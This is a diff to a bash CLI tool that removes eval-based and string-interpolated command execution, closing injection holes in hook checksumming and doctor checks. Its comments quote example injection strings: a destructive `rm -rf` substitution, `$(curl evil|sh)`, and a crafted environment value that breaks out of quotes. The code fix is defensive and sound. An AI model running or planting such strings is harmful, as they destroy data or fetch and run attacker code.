@@ -251,6 +251,67 @@ cmd_baseline() {
   echo "  sha256: $current"
 }
 
+# _safe_expand_env_path — expand a literal `$VAR/...` or `${VAR}/...`
+# token from an UNTRUSTED source (e.g. ~/.claude/settings.json hook
+# command field) using ONLY the explicit allowlist below. Prints the
+# resolved path to stdout on success (exit 0); returns 1 for any token
+# that doesn't match a known prefix (which includes command-substitution
+# attempts like `$(rm -rf /)` and `` `cmd` `` — those don't match the
+# literal `$NAME/` patterns).
+#
+# NEVER replace this with eval. Closes Codex R2 (PR #124): the previous
+# eval-based path executed arbitrary commands from settings.json when
+# audit.sh check_hooks or walter-os baseline-hooks ran.
+#
+# Keep this in sync with the identical copy in
+# skills/daily-supply-chain-audit/scripts/audit.sh.
+_safe_expand_env_path() {
+  local tok="$1"
+  # shellcheck disable=SC2016 # single-quoted '$VAR/' is INTENTIONAL —
+  # the case patterns must match the LITERAL `$NAME` text in $tok (which
+  # came from settings.json). Expansion is what we're protecting against.
+  case "$tok" in
+    '$HOME'/*)              printf '%s' "${HOME}${tok#\$HOME}" ;;
+    '${HOME}'/*)            printf '%s' "${HOME}${tok#'${HOME}'}" ;;
+    '$WALTER_OS_HOME'/*)    [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#\$WALTER_OS_HOME}" ;;
+    '${WALTER_OS_HOME}'/*)  [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#'${WALTER_OS_HOME}'}" ;;
+    '$WALTER_CONFIG'/*)     [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#\$WALTER_CONFIG}" ;;
+    '${WALTER_CONFIG}'/*)   [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#'${WALTER_CONFIG}'}" ;;
+    *)                      return 1 ;;
+  esac
+}
+
+# _hash_file — portable SHA256 of a file's content (GNU/BSD).
+# Returns the 64-char hex hash, or empty string if the file is unreadable
+# or no hasher is installed.
+_hash_file() {
+  local file="$1"
+  [[ -r "$file" && -f "$file" ]] || { echo ""; return; }
+  if command -v sha256sum >/dev/null 2>&1; then
+    sha256sum "$file" 2>/dev/null | awk '{print $1}'
+  elif command -v shasum >/dev/null 2>&1; then
+    shasum -a 256 "$file" 2>/dev/null | awk '{print $1}'
+  else
+    echo ""
+  fi
+}
+
+# _hook_checksums_schema_version — detect existing baseline schema.
+# Returns: "v1" (legacy array of command-strings), "v2" (typed object
+# with .version=2), "missing" (no file), or "unknown" (corrupted).
+# See ADR 0016 for the schema migration design.
+_hook_checksums_schema_version() {
+  local file="${WALTER_CONFIG}/hook-checksums.json"
+  [[ -f "$file" ]] || { echo "missing"; return; }
+  if jq -e 'type == "object" and .version == 2' "$file" >/dev/null 2>&1; then
+    echo "v2"
+  elif jq -e 'type == "array"' "$file" >/dev/null 2>&1; then
+    echo "v1"
+  else
+    echo "unknown"
+  fi
+}
+
 cmd_baseline_hooks() {
   require_jq
   local settings="$CLAUDE_SETTINGS"
@@ -259,8 +320,66 @@ cmd_baseline_hooks() {
     exit 2
   fi
   local checksums="${WALTER_CONFIG}/hook-checksums.json"
-  jq '[.hooks // {} | .. | objects | select(has("command")) | .command]' "$settings" > "$checksums"
-  echo "✓ Hook checksums refreshed: $checksums"
+
+  local prev_schema; prev_schema=$(_hook_checksums_schema_version)
+  case "$prev_schema" in
+    v1) echo "info: migrating hook-checksums.json from v1 (string array) to v2 (typed object with content sha256)" ;;
+    unknown) echo "warning: existing hook-checksums.json schema not recognized; overwriting with v2" ;;
+  esac
+
+  # Extract every {command:...} hook entry from settings.json
+  local hooks_array
+  hooks_array=$(jq '[.hooks // {} | .. | objects | select(has("command"))]' "$settings")
+
+  # Build v2 entries: {command, path, sha256} per hook.
+  # path = first whitespace-separated token of command (the executable).
+  local result
+  result=$(jq -n '{version: 2, hooks: []}')
+
+  local n; n=$(jq 'length' <<<"$hooks_array")
+  local i=0
+  while [[ $i -lt $n ]]; do
+    local cmd; cmd=$(jq -r ".[$i].command" <<<"$hooks_array")
+    # Resolve path: ONLY treat the first token as a file path if it
+    # LOOKS like one (starts with /, ./, ~/, or a $ env-var). Anything
+    # else (echo, /bin/sh -c "...", inline expressions) is treated as
+    # an inline command — path="" → audit skips content check + does
+    # not emit "hook-file-missing". Copilot R1 #124 R1.1.
+    local first_tok; first_tok=$(awk '{print $1}' <<<"$cmd")
+    local path=""
+    case "$first_tok" in
+      /*|./*|../*)
+        [[ -f "$first_tok" ]] && path="$first_tok"
+        ;;
+      ~/*)
+        local resolved="${first_tok/#\~/$HOME}"
+        [[ -f "$resolved" ]] && path="$resolved"
+        ;;
+      \$*)
+        # Env-var-prefixed path. Use the explicit allowlist in
+        # _safe_expand_env_path — NEVER eval. Closes Codex R2 (PR #124):
+        # eval on a token sourced from settings.json was an RCE vector
+        # (an attacker who could tamper with ~/.claude/settings.json
+        # could put `$(curl evil|sh)/foo` in a hook command field).
+        # The helper is defined below; keep it byte-identical with the
+        # copy in skills/daily-supply-chain-audit/scripts/audit.sh.
+        local resolved=""
+        if resolved="$(_safe_expand_env_path "$first_tok")"; then
+          [[ -n "$resolved" && -f "$resolved" ]] && path="$resolved"
+        fi
+        ;;
+    esac
+    local sha=""
+    [[ -n "$path" ]] && sha=$(_hash_file "$path")
+    result=$(jq --arg c "$cmd" --arg p "$path" --arg s "$sha" \
+      '.hooks += [{command: $c, path: $p, sha256: $s}]' <<<"$result")
+    i=$((i + 1))
+  done
+
+  # Atomic write + deterministic sort
+  mkdir -p "$(dirname "$checksums")"
+  echo "$result" | jq --sort-keys '.' > "${checksums}.tmp" && mv "${checksums}.tmp" "$checksums"
+  echo "✓ Hook checksums refreshed (v2 schema, $n entries): $checksums"
 }
 
 # Re-snapshot external/**/hooks/scripts/*.{sh,py,js} after an intentional
@@ -1141,15 +1260,26 @@ cmd_doctor() {
   tier_check 1 "WALTER_OS_HOME exists" test -d "$WALTER_OS_HOME"
   tier_check 1 "env file present" test -f "${WALTER_CONFIG}/env"
   tier_check 1 "secrets template present" test -f "${WALTER_CONFIG}/secrets.env"
-  # shellcheck disable=SC2088 # tildes here are labels, not paths
+  # Codex R3 (#124): replace `bash -c "...$WALTER_OS_HOME..."` string
+  # interpolation with positional-arg passing. The previous form let a
+  # crafted WALTER_OS_HOME (e.g. `"; rm -rf ~; echo "`) break out of the
+  # quoted string and execute commands in the doctor subprocess. Passing
+  # the value as $1 via `bash -c '...' bash "$WALTER_OS_HOME"` keeps it
+  # inert as a variable inside the inner bash — no re-interpretation.
+  # shellcheck disable=SC2088,SC2016 # tildes are labels; single-quoted
+  # `$HOME` / `$1` in bash -c is INTENTIONAL — that's the positional-arg
+  # passing pattern from Codex R3 #124 that prevents WALTER_OS_HOME
+  # interpolation injection. Expansion happens in the inner bash, not here.
   tier_check 1 '~/.claude/CLAUDE.md symlinked to walter-os' \
-    bash -c "[[ -L \"\$HOME/.claude/CLAUDE.md\" ]] && [[ \"\$(readlink \"\$HOME/.claude/CLAUDE.md\")\" == \"$WALTER_OS_HOME\"* ]]"
-  # shellcheck disable=SC2088
+    bash -c '[[ -L "$HOME/.claude/CLAUDE.md" ]] && [[ "$(readlink "$HOME/.claude/CLAUDE.md")" == "$1"* ]]' \
+    bash "$WALTER_OS_HOME"
+  # shellcheck disable=SC2088,SC2016
   tier_check 1 '~/.codex/AGENTS.md symlinked to walter-os' \
-    bash -c "[[ -L \"\$HOME/.codex/AGENTS.md\" ]] && [[ \"\$(readlink \"\$HOME/.codex/AGENTS.md\")\" == \"$WALTER_OS_HOME\"* ]]"
-  # shellcheck disable=SC2088
+    bash -c '[[ -L "$HOME/.codex/AGENTS.md" ]] && [[ "$(readlink "$HOME/.codex/AGENTS.md")" == "$1"* ]]' \
+    bash "$WALTER_OS_HOME"
+  # shellcheck disable=SC2088,SC2016
   tier_check 1 '~/.local/bin/walter-os symlinked' \
-    bash -c "[[ -L \"\$HOME/.local/bin/walter-os\" ]]"
+    bash -c '[[ -L "$HOME/.local/bin/walter-os" ]]'
 
   # Tier 2: local tooling — skills, MCP profile, audit cadence.
   # shellcheck disable=SC2088
@@ -1172,8 +1302,10 @@ cmd_doctor() {
   # Tier 4: Council prerequisites.
   tier_check 4 "trust-tiers.yml present (Tier IV)" \
     test -f "${WALTER_CONFIG}/trust-tiers.yml"
+  # shellcheck disable=SC2016 # single-quoted bash -c is intentional —
+  # positional-arg pattern prevents WALTER_OS_HOME interpolation injection.
   tier_check 4 "Council agent definitions present (Tier IV)" \
-    bash -c "ls -1 \"$WALTER_OS_HOME/agents\"/*.md 2>/dev/null | grep -q ."
+    bash -c 'ls -1 "$1/agents"/*.md 2>/dev/null | grep -q .' bash "$WALTER_OS_HOME"
 
   # CLI presence checks (tier 1 — needed for any agent install).
   echo
